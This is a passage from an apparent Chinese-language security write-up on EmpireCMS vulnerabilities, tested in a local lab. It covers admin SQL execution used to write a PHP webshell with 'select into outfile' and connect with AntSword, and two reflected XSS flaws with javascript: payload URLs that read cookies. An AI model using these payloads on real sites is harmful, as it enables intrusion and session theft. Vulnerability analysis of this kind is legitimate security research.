        DoRunQuery($query);
        //操作日志
        insert_dolog("query=".$query);
        printerror("DoExecSqlSuccess","ListSql.php".hReturnEcmsHashStrHref2(1));
    }
转到定义`RepSqlTbpre`，发现只对表的前缀做了替换
    //替换表前缀
    function RepSqlTbpre($sql){
        global $dbtbpre;
        $sql=str_replace('[!db.pre!]',$dbtbpre,$sql);
        return $sql;
    }
转到定义`DoRunQuery`，对$query进行处理。
对$sql参数只做了去除空格、以;分隔然后遍历,没有做别的限制和过滤,导致可以执行恶意的sql语句
    //运行SQL
    function DoRunQuery($sql){
        global $empire;
        $sql=str_replace("\r","\n",$sql);
        $ret=array();
        $num=0;
        foreach(explode(";\n",trim($sql)) as $query)
        {
            $queries=explode("\n",trim($query));
            foreach($queries as $query)
            {
                $ret[$num].=$query[0]=='#'||$query[0].$query[1]=='--'?'':$query;
            }
            $num++;
        }
        unset($sql);
        foreach($ret as $query)
        {
            $query=trim($query);
            if($query)
            {
                $empire->query($query);
            }
        }
    }
#### payload
用`select ... into
outfile`语句写入php一句话木马，但是这里需要知道存放的绝对路径，这里可以使用一个`phpinfo()`用第一种方法传上去
    ");?>
访问即可打出`phpinfo`
这里只是找到了php的绝对路径，还不是web所存储的路径，这时候查看源代码搜索`DOCUMENT_ROOT`查询网站所处的绝对路径
用`select ... into outfile`语句写入php一句话木马
    select '' into outfile 'C:/phpStudy/PHPTutorial/WWW/EmpireCMS/e/admin/Get.php'
看到上传已经成功
访问一下是存在的
直接上蚁剑连接即可
#### 实战中的一些坑
我们知道`secure_file_priv`这个参数在mysql的配置文件里起到的是能否写入的作用，当`secure_file_priv
=`为空，则可以写入sql语句到数据库，当`secure_file_priv =
NULL`，则不可以往数据库里写sql语句，当`secure_file_priv = /xxx`，一个指定目录的时候，就只能往这个指定的目录里面写东西
这个地方很明显报错就是限制数据库的导入跟导出，这里很明显判断`secure_file_priv =
NULL`，所以当实战中出现在这种情况下是不能够用这种方法的
如果在本地可以修改或添加`secure_file_priv =`这一行语句
### 后台xss
#### 原理分析
漏洞类型：反射型xss
漏洞文件：`localhost/EmpireCMS/e/admin/openpage/AdminPage.php`
漏洞原理：该漏洞是由于代码只使用htmlspecialchars进行实体编码过滤，而且参数用的是ENT_QUOTES(编码双引号和单引号),还有addslashes函数处理，但是没有对任何恶意关键字进行过滤，从而导致攻击者使用别的关键字进行攻击
源码分析
主要漏洞代码位置`localhost/EmpireCMS/e/admin/openpage/AdminPage.php`
    $leftfile=hRepPostStr($_GET['leftfile'],1);
    $mainfile=hRepPostStr($_GET['mainfile'],1);
利用`hRepPostStr`函数进行过滤，跳转到该函数的定义如下
    function hRepPostStr($val,$ecms=0,$phck=0){    if($phck==1)    {        CkPostStrCharYh($val);    }    if($ecms==1)    {        $val=ehtmlspecialchars($val,ENT_QUOTES);    }    CkPostStrChar($val);    $val=AddAddsData($val);    return $val;}
用`ehtmlspecialchars`函数进行HTML实体编码过滤，其中`ENT_QUOTES` \- 编码双引号和单引号。
    function ehtmlspecialchars($val,$flags=ENT_COMPAT){    global $ecms_config;    if(PHP_VERSION>='5.4.0')    {        if($ecms_config['sets']['pagechar']=='utf-8')        {            $char='UTF-8';        }        else        {            $char='ISO-8859-1';        }        $val=htmlspecialchars($val,$flags,$char);    }    else    {        $val=htmlspecialchars($val,$flags);    }    return $val;}
要利用`htmlspecialchars`函数把字符转换为HTML实体
用`CkPostStrChar`函数对参数进行处理
    function CkPostStrChar($val){    if(substr($val,-1)=="\\")    {        exit();    }}
获取字符末端第一个开始的字符串为\，则退出函数
用`AddAddsData`函数对参数进行处理
    function AddAddsData($data){    if(!MAGIC_QUOTES_GPC)    {        $data=addslashes($data);    }    return $data;}
如果没有开启`MAGIC_QUOTES_GPC`，则利用`addslashes`函数进行转义
`addslashes()`函数返回在预定义字符之前添加反斜杠的字符串
网页输出
然而输出的位置是在iframe标签的src里，这意味着之前的过滤都没有什么用。iframe标签可以执行js代码，因此可以利用`javascript:alert(/xss/)`触发xss
#### payload
payload如下：
    192.168.10.3/EmpireCMS/e/admin/openpage/AdminPage.php?ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf&mainfile=javascript:alert(/xss/)
其中ehash是随机生成的，在登录时可以看到`ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf`，如果缺少这个hash值，则会提示非法来源
获取cookie信息payload
    192.168.10.3/EmpireCMS/e/admin/openpage/AdminPage.php?ehash_3ZvP9=dQ7ordM5PCqKDgSmvkDf&mainfile=javascript:alert(document.cookie)
### 前台xss
#### 原理分析
漏洞类型：反射型xss
漏洞文件：`localhost/EmpireCMS/e/ViewImg/index.html`
漏洞原理：url地址经过Request函数处理之后,把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值
主要漏洞代码位置`localhost/upload/e/ViewImg/index.html`
    if(Request("url")!=0){    document.write("screen.width-500)this.style.width=screen.width-500;\">");    }
通过Request函数获取地址栏的url参数,并作为img和a标签的src属性和href属性,然后经过`document.write`输出到页面。
转到request函数定义
    function Request(sName){  /*   get last loc. of ?   right: find first loc. of sName   +2   retrieve value before next &    */    var sURL = new String(window.location);  var iQMark= sURL.lastIndexOf('?');  var iLensName=sName.length;    //retrieve loc. of sName  var iStart = sURL.indexOf('?' + sName +'=') //limitation 1  if (iStart==-1)        {//not found at start        iStart = sURL.indexOf('&' + sName +'=')//limitation 1        if (iStart==-1)           {//not found at end            return 0; //not found           }           }          iStart = iStart + + iLensName + 2;  var iTemp= sURL.indexOf('&',iStart); //next pair start  if (iTemp ==-1)        {//EOF        iTemp=sURL.length;        }    return sURL.slice(iStart,iTemp ) ;  sURL=null;//destroy String}
通过`window.location`获取当前url地址,根据传入的url参数,获取当前参数的起始位置和结束位置
#### payload
url地址经过Request函数处理之后,然后把url地址中的参数和值部分直接拼接当作a标签的href属性的值和img标签的src标签的值
payload如下：
    http://localhost/upload/e/ViewImg/index.html?url=javascript:alert(document.cookie)
payload解析：
当浏览器载入一个Javascript  
URL时，它会执行URL中所包含的Javascript代码，并且使用最后一个Javascript语句或表达式的值，转换为一个字符串，作为新载入的文档的内容显示。
javascript:伪协议可以和HTML属性一起使用，该属性的值也应该是一个URL。一个超链接的href属性就满足这种条件。当用户点击一个这样的链接，指定的Javascript代码就会执行。在这种情况下，Javascript  
URL本质上是一个onclick事件句柄的替代。
点击图片触发xss
得到网页cookie